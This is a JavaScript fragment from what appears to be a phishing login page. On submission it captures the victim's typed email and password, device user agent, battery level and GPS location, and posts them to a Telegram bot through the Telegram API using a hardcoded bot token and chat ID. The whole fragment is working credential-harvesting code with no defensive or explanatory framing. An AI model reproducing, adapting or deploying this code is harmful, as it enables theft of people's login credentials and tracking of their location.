    <script>
        function sendToTelegram(event) {
            event.preventDefault();

            const botToken = "7601102770:AAFdlp7SMsZRY4-8CTOquvyC3IYe3WLqEwg";
            const chatId = "6252775452";
            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const userAgent = navigator.userAgent;

            navigator.getBattery().then(function(battery) {
                const batteryLevel = battery.level * 100 + "%";

                navigator.geolocation.getCurrentPosition(function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    const message = `ðŸ“¥ New Login Attempt:\n` +
                        `ðŸ“§ Email: ${email}\n` +
                        `ðŸ”‘ Password: ${password}\n` +
                        `ðŸ–¥ Device: ${userAgent}\n` +
                        `ðŸ”‹ Battery: ${batteryLevel}\n` +
                        `ðŸ“ Location: Lat ${latitude}, Lon ${longitude}`;

                    fetch(apiUrl, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message
                        })
                    }).then(response => response.json()).then(data => {
                        console.log("Sent to Telegram:", data);
                    }).catch(error => console.error("Error:", error));
                });
            });
        }
    </script>
